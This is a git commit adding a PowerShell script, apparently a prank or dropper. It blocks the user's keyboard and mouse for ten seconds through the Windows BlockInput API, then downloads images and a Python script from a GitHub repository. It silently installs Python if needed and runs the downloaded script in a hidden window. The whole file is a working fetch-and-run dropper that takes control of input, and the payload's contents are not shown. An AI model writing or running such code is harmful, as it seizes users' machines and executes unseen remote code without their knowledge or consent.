13a2aa91e3d039322ed5ea682d7c04eb710f22ea
M4rc333l <94375791+M4rc333l@users.noreply.github.com>
2024-06-22 17:52:45 +0200

    Add files via upload

---
+++ trycatchme.ps1
@@ -0,0 +1,21 @@
+$code = @"
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+"@
+$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
+function Disable-UserInput($seconds) {
+    $userInput::BlockInput($true)
+    Start-Sleep $seconds
+    $userInput::BlockInput($false)
+}
+Disable-UserInput -seconds 10 | Out-Null
+New-Item -ItemType Directory -Force -Path "trycatchthishiddenfolder" -ErrorAction SilentlyContinue
+$trycatchfolder = Get-Item ./trycatchthishiddenfolder
+$trycatchfolder.Attributes -= "Hidden"
+cd .\trycatchthishiddenfolder
+Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Patrick1.png" -OutFile "Patrick1.png"
+Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Patrick2.png" -OutFile "Patrick2.png"
+Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Spongebob.png" -OutFile "Spongebob.png"
+Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/TryCatchMe.py" -OutFile "script.py"
+$p = &{python -V} 2>&1
+$version = if($p -is [System.Management.Automation.ErrorRecord]) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile "Python-Install.exe"; Start-Process "Python-Install.exe" -ArgumentList "/passive InstallAllUsers=0 PrependPath=1" -Wait; Remove-Item "Python-Install.exe"; Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden} else { Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden }
